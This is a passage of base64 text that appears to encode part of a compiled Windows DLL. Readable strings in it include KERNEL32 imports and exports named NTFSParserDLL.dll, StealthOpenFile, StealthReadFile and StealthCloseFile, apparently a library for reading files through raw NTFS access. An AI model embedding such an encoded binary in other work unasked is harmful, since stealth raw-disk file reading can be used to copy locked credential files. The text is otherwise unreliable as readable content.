AAAAAAAAAAAAAAAAAAAAAAAAAMAAABQjwEAAAAAAAAAAAAAAAAAAAAAAAMAAABwjwEAAAAAAAAAAAAAAAAAAAAAAAMAAACQjwEAAAAAAAAAAAAAAAAAAAAAAAMAAACwjwEAAAAAAAAAAAAAAAAAAAAAAAMAAADQjwEAAAAAAAAAAAAAAAAAAAAAAAMAAADwjwEAAAAAAAAAAAAAAAAAAAAAAAEAAAAQkAEAAAAAAAAAAAAAAAAAAAAAAAMAAAAgkAEAAAAAAAAAAAAAAAAAAQAAAAQAAABAkAEAAAAAAAAAAAAAAAAAAAAAAAIAAABokAEAAAAAAAAAAAAAAAAAAAAAAAMAAACAkAEAAAAAAAAAAAAAAAAAAAAAAAMAAACgkAEAAAAAAAAAAAAAAAAAAQAAAAQAAADAkAEAAAAAAAAAAAAAAAAAAAAAAAMAAADokAEAAAAAAAAAAAAAAAAAAAAAAAIAAAAIkQEAAAAAAAAAAAAAAAAAAAAAAAIAAAAgkQEAAAAAAAAAAAAAAAAAAAAAAAEAAAA4kQEAAAAAAAAAAAAAAAAAAAAAAAEAAABIkQEAAAAAAAAAAAAAAAAAAAAAAAEAAABYkQEAAAAAAAAAAAAAAAAAAAAAAAEAAABokQEAAAAAAAAAAAAAAAAAAAAAAAEAAAB4kQEAAAAAAAAAAAAAAAAAAAAAAAEAAACgkQEAAAAAAAAAAAAAAAAAAAAAAAIAAACIkQEAAAAAAAAAAAAAAAAAAAAAAAEAAACwkQEAAAAAAAAAAAABAAAAAAAAAAAAAACA1AEA0JUBABCYAQAAAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAuNQBAOiVAQA4mAEAAAAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAPjUAQAAlgEAYJgBAAAAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAw1QEAGJYBAIiYAQAAAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAaNUBADCWAQCwmAEAAAAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAKDVAQBIlgEA2JgBAAAAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAADg1QEAYJYBAACZAQAAAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAENYBAHiWAQAomQEAAAAAAAAAAAAAA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QAAAAAAACMWAAD/////oAMBAAAAAACtAwEAAQAAALUDAQACAAAA1QMBAAAAAADxAwEAAwAAABkKAgAKMgZQ1G8AAOCFAQAZCwMAC0IHUAYwAADUbwAA4IUBAAEPBgAPZAcADzQGAA8yC3ABCgQACjQIAApSBnABBgIABlICMBEYBAAYNAkAClIGcNRvAAAIhgEA4FIAAP////9cUwAAAAAAAMVTAAD/////ERMCAApyBjDUbwAAMIYBAP////+QBAEAIFIAAP////88UgAAAAAAAMxSAAD/////ERMCAApSBjDUbwAAWIYBAP////+gBAEAgFEAAP////+gUQAAAAAAAAVSAAD/////GTAKACE0FQAQsgzwCuAI0AbABHADYAJQAP4AAICGAQBaAAAA/////2AEAQAAAAAAbAQBAAEAAAB8BAEAkE4AAP////8sTwAAAAAAAFRPAAABAAAA9U8AAAIAAAAOUAAAAQAAAFJRAAD/////ERMCAApSBjDUbwAAqIYBAP////8ABgEA8E0AAP////8QTgAAAAAAAIJOAAD/////GTMKACQ0GQAT8gzwCuAI0AbABHADYAJQAP4AANCGAQByAAAA/////zAEAQAAAAAAPAQBAAEAAABMBAEAAEsAAP////9ESwAAAAAAAHVLAAABAAAAEUwAAAIAAAAqTAAAAQAAAMFNAAD/////AQ0EAA1SCeAHYAZQIQoEAAp0DAAFNAsA8EQAABhFAABsqQEAIQAEAAB0DAAANAsA8EQAABhFAABsqQEAIQAAAPBEAAAYRQAAbKkBABkjBwAVARIACeAH0AXAAzACUAAA7MkAAIAAAAAhGwYAG/QbABN0GgAIZBkAwD8AAGZAAAC4qQEAIQAGAAD0GwAAdBoAAGQZAMA/AABmQAAAuKkBACEAAADAPwAAZkAAALipAQAZHwUADTRQAA0BTAAGcAAA7MkAAFgCAAAZOQkAKDR4ABcBcAAI8AbgBHADYAJQAAAA/gAA+IYBAHIDAAD/////IAUBAP////8sBQEA/////10FAQD/////jgUBAAAAAAC/BQEA/////8sFAQDAOQAA/////5s6AAAAAAAAszoAAP////+4OgAAAQAAACk7AAD/////LjsAAAAAAABZOwAA/////147AAACAAAAyTsAAP/////OOwAAAAAAAPI7AAD/////9zsAAAMAAABpPAAA/////248AAAAAAAAhDwAAAQAAACZPAAAAAAAABQ9AAD/////GT0AAAUAAACJPQAA/////wENBgANVAkADTIJ4AdwBmAhBQIABTQIAKA4AADjOAAAIKsBACEAAgAANAgAoDgAAOM4AAAgqwEAIQAAAKA4AADjOAAAIKsBABEiBgAiNBMAFtIScBFgEFDUbwAAIIcBAP////8QBwEA4DUAAP////9WNgAAAAAAAFg3AAD/////ARQGABRkCAAUNAYAFDIQcAEKBAAKZAkACjIGcCEFAgAFNAYA4DIAAAAzAACwqwEAIQACAAA0BgDgMgAAADMAALCrAQAhAAAA4DIAAAAzAACwqwEAER4IAB50CwAZZAoAFDQIAAZSAuDUbwAASIcBAP////9QBgEA/////1wGAQD/////aAYBAP////90BgEA/////4AGAQD/////jAYBAP////+YBgEA/////6QGAQD/////sAYBAP////+8BgEAgC0AAP/////OLQAAAAAAANEtAAD/////bC4AAAAAAACGLgAA/////5ouAAABAAAAtC4AAP/////ILgAAAgAAAOIuAAD/////9i4AAAMAAAAQLwAA/////7MvAAAEAAAA1C8AAP////9qMAAABQAAAIQwAAD/////mzAAAAYAAADlMAAA/////wIxAAAHAAAAHDEAAP////8wMQAACAAAAEoxAAD/////azEAAAkAAACFMQAA/////xQyAAAAAAAAERMCAApSBjDUbwAAcIcBAP////8QBgEAkCwAAP////+wLAAAAAAAAMQsAAD/////ERgEABg0CQAKUgZw1G8AAJiHAQAQLAAA/////zcsAAAAAAAASywAAP////8RHwoAH1QRABs0EAAPcgvwCeAHwAVwBGDUbwAAwIcBAP/////QBgEAAAAAANwGAQDQKQAA/////+IqAAAAAAAA8yoAAAEAAAAWKwAAAAAAABsrAAD/////ESIKACJkDQAdVAwAGDQLAApSBvAE4AJw1G8AAOiHAQD/////8AYBAAAAAAD8BgEAgCgAAP/////iKAAAAAAAAPMoAAABAAAAFikAAAAAAAAbKQAA/////xETAgAKUgYw1G8AABCIAQDgJwAA/////wAoAAAAAAAAZSgAAP////8REwIAClIGMNRvAAA4i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GNUb0ZpbGVIZWFkZXIAtANSYWlzZUV4Y2VwdGlvbgAAHwRSdGxMb29rdXBGdW5jdGlvbkVudHJ5AAAlBFJ0bFVud2luZEV4AB8BRXhpdFByb2Nlc3MAHQJHZXRNb2R1bGVIYW5kbGVFeFcAAEwCR2V0UHJvY0FkZHJlc3MAANwCSGVhcFNpemUAAMAEU2xlZXAAawJHZXRTdGRIYW5kbGUAADQFV3JpdGVGaWxlABoCR2V0TW9kdWxlRmlsZU5hbWVXAADXAkhlYXBGcmVlAADTAkhlYXBBbGxvYwAMA0lzVmFsaWRDb2RlUGFnZQBuAUdldEFDUAAAPgJHZXRPRU1DUAAAeAFHZXRDUEluZm8AcAJHZXRTdHJpbmdUeXBlVwAAgARTZXRMYXN0RXJyb3IAABgEUnRsQ2FwdHVyZUNvbnRleHQAJgRSdGxWaXJ0dWFsVW53aW5kAADiBFVuaGFuZGxlZEV4Y2VwdGlvbkZpbHRlcgAAswRTZXRVbmhhbmRsZWRFeGNlcHRpb25GaWx0ZXIA6wJJbml0aWFsaXplQ3JpdGljYWxTZWN0aW9uQW5kU3BpbkNvdW50AMYBR2V0Q3VycmVudFByb2Nlc3MAzgRUZXJtaW5hdGVQcm9jZXNzAADTBFRsc0FsbG9jAADVBFRsc0dldFZhbHVlANYEVGxzU2V0VmFsdWUA1ARUbHNGcmVlAGoCR2V0U3RhcnR1cEluZm9XAB4CR2V0TW9kdWxlSGFuZGxlVwAAUQJHZXRQcm9jZXNzSGVhcAAA+gFHZXRGaWxlVHlwZQDSAERlbGV0ZUNyaXRpY2FsU2VjdGlvbgAZAkdldE1vZHVsZUZpbGVOYW1lQQAAqQNRdWVyeVBlcmZvcm1hbmNlQ291bnRlcgDHAUdldEN1cnJlbnRQcm9jZXNzSWQAgAJHZXRTeXN0ZW1UaW1lQXNGaWxlVGltZQDhAUdldEVudmlyb25tZW50U3RyaW5nc1cAAGcBRnJlZUVudmlyb25tZW50U3RyaW5nc1cA8gBFbnRlckNyaXRpY2FsU2VjdGlvbgAAOwNMZWF2ZUNyaXRpY2FsU2VjdGlvbgAAQANMb2FkTGlicmFyeUV4VwAA2gJIZWFwUmVBbGxvYwCMA091dHB1dERlYnVnU3RyaW5nVwAAQQNMb2FkTGlicmFyeVcAAC8DTENNY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